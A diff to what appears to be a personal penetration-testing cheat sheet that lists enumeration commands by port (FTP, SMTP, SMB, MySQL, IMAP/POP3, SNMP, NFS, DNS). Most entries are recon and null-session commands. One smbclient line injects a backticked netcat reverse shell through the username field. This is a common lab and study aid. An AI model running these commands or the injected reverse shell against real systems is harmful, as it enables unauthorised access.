@@ -14,12 +14,20 @@ services/version webshell plugin
 
 Port 21 FTP
 $ ftp anonymous@ipadd
+-> check : status, trace, debug, ls -R
 $ ftp-ssl -z secure -z verify=0 -p ipadd
 $ ftp-ssl -z secure -z verify=0 -z cipher="$(openssl ciphers -tls1)" -p ipadd
 $ info || put file.txt (cek info and put file)
+$ get file
+$ wget -m --no-passive ftp://anon:anon@ip
+$ tree .
+$ check interaction
+  nc -nv ip 21
+  telnet ip 21
 
 Port 25/110 SMTP
 Check service and version
+$ sudo nmap ip -sC -sV -p25 --script smtp-open-relay -v
 $ smtp-user-enum -U users.txt -t hostname
 $ telnet IP 25/110 OR nc -nv IP 25/110
  - USER user
@@ -37,7 +45,8 @@ $ nmap -p 445 vuln -oA ipadd
 $ nmap --script=smb-vuln* -oN nmap/script_smbvuln -v --min-rate 10000 -p 139,445
 $ smbmap -H ipadd
 $ smbmap -u '' -p '' -R -H IP
-$ smbclient //ipadd/dir
+$ smbclient //ipadd/dir (v)
+-> check get, !ls, !cat
 $ smbclient -U '' -L //ip
 $ smbclient -L //IP -N OR \\$IP
 $ smbclient -N //IP/tmp -> dir, put
@@ -45,6 +54,10 @@ $ add [global] client min protocol=NT1
 $ smbclient -N //IP/tmp --option='client min protocol=NT1'
 $ smbclient //IP/tmp -U "./=`nohup nc -e /bin/sh IP 443`" -> run nc
 $ smbclient \\\\$IP\\dir\\ -U user
+$ check interaction
+  rpcclient -U "" ip
+  - srvinfo, enumdomains, queryinfo, netshareenumall, netsharegetinfo dir, enumdomuser, queryuser
+  netexec smb ip --shares -u '' -p ''
 
 Port 80 web server
 $ dirsearch -u http://yourip, OR
@@ -61,10 +74,41 @@ $	ffuz -u domain -d "request" -w wordlist -H "header" (seclist/fuzz,specialchar)
 $	wpscan -e --url domain
 $ joomscan
 
+Port 3306 MySQL
+$ sudo nmap ip -sV -sC -p3306 --script mysql*
+interaction
+$ mysql -u root -p pass -h ip
+  show databases;
+  select version();
+  use mysql;
+  show tables;
+  use sys;
+  select host, unique_users from host_summary;
+
+Port 110,143,993,995 IMAP/POP3
+$ sudo nmap ip -sV -p110,143,993,995
+$ curl -l 'imaps://ip' --user admin:1234 -v
+$ openssl s_client -connect ip:pop3s/imaps
+
 Port 199
 There’s a tool called “snmpwalk” 
-$ snmpwalk -c public -v1 -t 10 IP
+$ snmpwalk -v2c -c public -v1 -t 10 IP
 $ snmp-check IP
+you can install onesixtyone
+
+Port 111/2049 NFS
+$ sudo nmap ip -p111,2049 -sV -sV | or add --script nfs*
+$ showmount -e ip
+$ mkdir targetNFS -> sudo mount -t nsf ip:/ ./targetNFS/ -o nolock -> cd targetNFS -> tree .
+
+DNS
+$ dig soa domain
+$ dig ns domain @ip
+$ dig CH TXT version.bind ip
+$ dig any domain @ip
+$ dig axfr domain@ip
+
+
 
 Windows enum:
 ### Local Enumeration:
